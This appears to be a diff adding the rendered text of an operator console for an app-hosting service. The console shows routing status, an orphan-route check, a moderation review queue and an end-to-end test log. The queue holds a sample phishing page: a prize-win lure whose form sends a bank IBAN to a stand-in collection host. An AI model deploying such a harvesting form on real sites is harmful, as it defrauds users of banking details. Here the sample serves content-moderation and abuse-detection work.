@@ -1,0 +1,236 @@
+Act 2 · Ops
+Founder console
+Signed in as vinc.hafner3@gmail.com
+State
+Hosting switch
+ON
+Worker deployed
+YES
+Zone found
+YES
+Wildcard proxied
+YES
+Route bound
+YES
+0099 · registry (ops_apps)
+APPLIED
+0100 · audit (ops_app_audit)
+APPLIED
+Apps domain
+justgoblin.app
+
+The documented trap: a * record can exist and still not be proxied (grey cloud). Then the Worker never runs.
+
+Last loaded: 29/07/2026, 09:14:00
+
+Reload
+Provision the router
+
+Uploads the Worker, finds the zone, sets the wildcard record and binds the route. Idempotent — running it repeatedly is explicitly fine.
+
+Provision the router
+Publish a test app
+
+Publishes a project of this account under its own name. The scan runs before, the verification after.
+
+Project
+Choose a project …
+Mein Testprojekt
+Name
+
+Lower-case letters, digits and hyphens. The check is not a reservation — only publishing decides.
+
+Publish
+
+Choose a project first.
+
+Hosted apps
+
+Every app in the registry. Suspend and teardown act on any account’s app — this is operator tooling.
+
+goblin-test-app
+ACTIVE
+https://goblin-test-app.justgoblin.app
+Open the public URL
+Suspend / Teardown
+ein-sehr-langer-app-name-zum-testen
+SUSPENDED
+https://ein-sehr-langer-app-name-zum-testen.justgoblin.app
+Open the public URL
+Unsuspend / Teardown
+Orphan check
+
+Asks Cloudflare (KV and R2) and the registry, and reports whatever sits on the substrate with no registry row pointing at it. Report only — this card deletes nothing.
+
+Run the check
+Finding
+FOUND
+
+There is a finding. Look at each line individually before anything happens to it.
+
+Orphaned KV routes
+1 FOUND
+
+A hostname that resolves while the registry has never heard of it: publicly reachable, invisible to this console, impossible to suspend. This is the actual X1 finding.
+
+verwaiste-adresse-aus-einer-loeschung
+Routes on deleted apps
+NONE FOUND
+
+Here a row does exist, and it says "deleted" — yet the hostname still resolves. The teardown never finished; it can be retried from "Hosted apps".
+
+Orphaned R2 prefixes
+NOT CHECKED
+
+Files with no row. No public access as long as no route points at them — this is storage cost nobody is billed for.
+
+This field came back as null, i.e. unknown. That does NOT mean "none found" — it means the check could not be completed. The reason appears in the notes.
+
+Counted
+
+Registry rows
+2
+Routes in KV
+3
+Prefixes in R2
+UNKNOWN
+
+Notes from the sweep
+
+R2 konnte nicht gelesen werden: 10001 Unauthorized
+1 verwaiste KV-Route(n) ohne Registry-Zeile — diese Adressen sind öffentlich erreichbar.
+
+Checked at: 13/08/2026, 09:20:00
+
+There is deliberately no delete button here. Cleaning up demands named app ids, a reason for the audit log, and a fresh registry check immediately before deletion — that stays its own explicit step, not a button beside a report.
+
+Review queue
+
+Publishes that cleared the fixed rule list and were then held by the classifier. Nothing was uploaded and nothing is online — it is waiting on your decision.
+
+gewinnspiel-2026
+STAGE 2 (CLASSIFIER)
+Waiting since
+13/08/2026, 07:41:00
+Stage 1 (fixed rules)
+PASS
+Categories
+deception
+Confidence
+medium
+Scanned
+3 files
+Tokens (in/out)
+812 / 21
+
+The classifier read the page and found something a human should look at.
+
+Hide the content
+Approve / Reject
+
+Raw source, shown as text. Nothing here is executed, embedded as HTML, or allowed to fetch anything — which is why you see markup and not a page.
+
+index.html · 152 B
+<!doctype html>
+<h1>Du hast gewonnen!</h1>
+<script>document.title = "x"</script>
+<form action="https://beispiel.invalid/collect">
+  <input name="iban">
+</form>
+
+Non-text files (names only): logo.png
+
+Reason
+
+Optional for an approval — recorded either way.
+
+A rejection needs a reason — the user gets to read it.
+
+Approving starts the publish immediately. The fixed rule list runs again: an approval overrides the classifier, not the hard rules.
+
+A rejection takes nothing offline — nothing ever was. It closes the item and writes the audit row.
+
+Approve
+Reject
+ein-sehr-langer-kandidaten-name-zum-testen
+STAGE 2 (CLASSIFIER)
+Waiting since
+13/08/2026, 06:02:00
+Stage 1 (fixed rules)
+PASS
+Categories
+UNKNOWN
+
+none — the check could not be completed
+
+Confidence
+UNKNOWN
+Scanned
+41 files
+Tokens (in/out)
+0 / 0
+
+The page was larger than the scan budget. It was NOT truncated and judged — it was not judged at all. That says nothing about its content.
+
+Show the content
+Approve / Reject
+Recently decided
+
+Nothing has been decided yet.
+
+Read from the review queue itself. The evidence row in ops_app_audit is untouched by this and is kept for 12 months — it outlives account deletion, this list does not.
+
+End-to-end run
+
+Drives the whole loop on the real infrastructure: preflight, scan battery, five publishes, rename with 410, hostile file, suspend and unsuspend, teardown. Takes 5–15 minutes.
+
+Progress is held in the API’s memory. A redeploy wipes this VIEW — the run itself may well carry on and finish, because its writes go straight to Cloudflare and Supabase. Copy the result before you deploy anything.
+
+Start E2E
+State
+FINISHED
+Elapsed
+720s
+steps reported
+6
+
+No percentage progress bar: how many steps a run has is only settled at the end — a blocked preflight ends after two. What is shown is what was reported.
+
+✓
+preflight:router
+router deployed, wildcard proxied, route bound
+✓
+scan:battery
+9/9
+✓
+publish:5/5
+live at https://e2e-ab12.justgoblin.app (3 files, verified 3/3 assets byte-identical)
+✓
+rename:old-410
+https://e2e-ab12.justgoblin.app → 410 (no redirect) · Propagation 34s
+✓
+hostile:blocked
+refused at the scan: AUP-PHISH-01
+✓
+suspend:page-live
+https://e2e-ab12-b.justgoblin.app → 403 with the suspended page · Propagation 41s
+
+Every step green.
+
+PUBLISH LOOPS
+5/5
+SCAN BATTERY
+9/9
+SUSPENSION ROUND-TRIP
+3/3
+Copy the result
+
+Copies the result as JSON to the clipboard — without tokens, keys and addresses.
+
+Scrubbed: email addresses and anything that looks like a key have been removed.
+
+Copy the result
+
+Summary
+
+E2E BESTANDEN · Veröffentlichungen 5/5 · Scan-Batterie 9/9 · Sperr-Runde 3/3 · Schritte 6/6 · 12 min
